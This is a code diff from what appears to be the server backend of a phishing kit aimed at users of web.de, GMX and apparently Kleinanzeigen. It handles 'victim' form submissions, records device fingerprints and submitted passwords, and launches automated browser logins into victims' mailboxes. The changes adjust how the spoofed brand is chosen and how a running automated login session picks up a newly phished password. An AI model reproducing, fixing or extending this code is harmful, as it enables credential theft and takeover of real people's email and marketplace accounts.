@@ -8,18 +8,15 @@ const { logAdminModeFlow } = require('../lib/adminModeFlowLog');
 const { emailEligibleForUnitedInternetMailScript, mailboxAutomationLogLabel } = require('../utils/mailMailboxLogin');
 const {
   jsonPayloadMatchesKleinClientShape,
-  submitIndicatesKleinScenario,
-  leadIsKleinMarked
+  submitIndicatesKleinScenario
 } = require('../utils/kleinSubmitDetect');
 const { deviceSignatureFromRequest, applyLeadTelemetry } = require('../lib/leadTelemetry');
 const { isLocalHost } = require('../utils/localNetwork');
 const SERVER_INSTANCE = process.env.INSTANCE_NAME || ('pm2-' + (process.env.pm_id || 'na'));
 
-/** На localhost/LAN: бренд сабмита из clientFormBrand (форма), иначе как по Host. */
+/** Бренд сабмита: сначала clientFormBrand (форма), иначе как по Host. */
 function submitBrandIdForVictimPost(req, json, getBrandFn) {
-  const host = (req.headers && req.headers.host ? String(req.headers.host) : '').split(':')[0].toLowerCase();
   const fromHost = getBrandFn(req).id;
-  if (!isLocalHost(host)) return fromHost;
   const cfb = json && json.clientFormBrand != null ? String(json.clientFormBrand).trim().toLowerCase() : '';
   if (cfb === 'webde' || cfb === 'gmx' || cfb === 'klein') return cfb;
   return fromHost;
@@ -72,49 +69,26 @@ function shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadRef, forc
   }
   const dbSaysActive = fresh.webdeScriptActiveRun != null && fresh.webdeScriptActiveRun !== '';
   const procSaysActive = automationService.isLeadAutomationAlreadyRunning(fresh.id);
-  if (dbSaysActive || procSaysActive) {
+  if (procSaysActive) {
+    // Не перезапускаем активный браузер/скрипт на повторных submit/update-password:
+    // текущая сессия должна продолжать работу и подхватить новый пароль.
+    logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'активный автозапуск (процесс/lock)');
+    return true;
+  }
+  if (dbSaysActive) {
+    // Если живого процесса нет, а флаг в БД остался — это stale state.
+    // Чистим флаг и разрешаем обычный запуск без preempt/kill.
     if (recoveryCtx && typeof recoveryCtx.persistLeadPatch === 'function') {
       try {
-        const emLock = String(fresh.email || fresh.emailKl || '').trim().toLowerCase();
-        automationService.preemptWebdeLoginForReplacedLead(fresh.id, emLock);
         recoveryCtx.persistLeadPatch(fresh.id, { webdeScriptActiveRun: null });
         if (typeof recoveryCtx.invalidateLeadsCache === 'function') recoveryCtx.invalidateLeadsCache();
-        const logTf = recoveryCtx.logTerminalFlow;
-        if (typeof logTf === 'function') {
-          logTf(
-            'AUTO-LOGIN',
-            'Система',
-            '—',
-            fresh.email || fresh.emailKl || '—',
-            'перед автозапуском: закрыт предыдущий сеанс (браузер/lock) и сброшен webdeScriptActiveRun · leadId=' + fresh.id,
-            fresh.id
-          );
-        }
+        return false;
       } catch (e) {
-        console.warn('[AUTO-LOGIN] подготовка перезапуска id=' + fresh.id + ':', e && e.message ? e.message : e);
-        if (automationService.isLeadAutomationAlreadyRunning(fresh.id)) {
-          logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'активный автозапуск (процесс/lock)');
-          return true;
-        }
-        if (dbSaysActive) {
-          logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'webdeScriptActiveRun в БД');
-          return true;
-        }
+        console.warn('[AUTO-LOGIN] очистка stale webdeScriptActiveRun id=' + fresh.id + ':', e && e.message ? e.message : e);
       }
-      if (automationService.isLeadAutomationAlreadyRunning(fresh.id)) {
-        logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'активный автозапуск после preempt — отклонено');
-        return true;
-      }
-      return false;
     }
-    if (procSaysActive) {
-      logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'активный автозапуск (процесс/lock)');
-      return true;
-    }
-    if (dbSaysActive) {
-      logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'webdeScriptActiveRun в БД');
-      return true;
-    }
+    logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'webdeScriptActiveRun в БД');
+    return true;
   }
   return false;
 }
@@ -850,8 +824,12 @@ async function handle(scope) {
       if (req.headers && req.headers['user-agent']) lead.userAgent = String(req.headers['user-agent']);
       if (json.fingerprint && typeof json.fingerprint === 'object') lead.fingerprint = json.fingerprint;
       applyVictimTelemetry(lead, req, json, getClientIp(req), getBrand);
+      const currentActionBrand = submitBrandIdForVictimPost(req, json, getBrand);
+      if (currentActionBrand === 'webde' || currentActionBrand === 'gmx' || currentActionBrand === 'klein') {
+        lead.brand = currentActionBrand;
+      }
 
-      if (leadIsKleinMarked(lead) || getBrand(req).id === 'klein') {
+      if (currentActionBrand === 'klein') {
         const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
         const storedKl = (lead.passwordKl != null) ? String(lead.passwordKl) : '';
         if (currentPassword !== storedKl) {
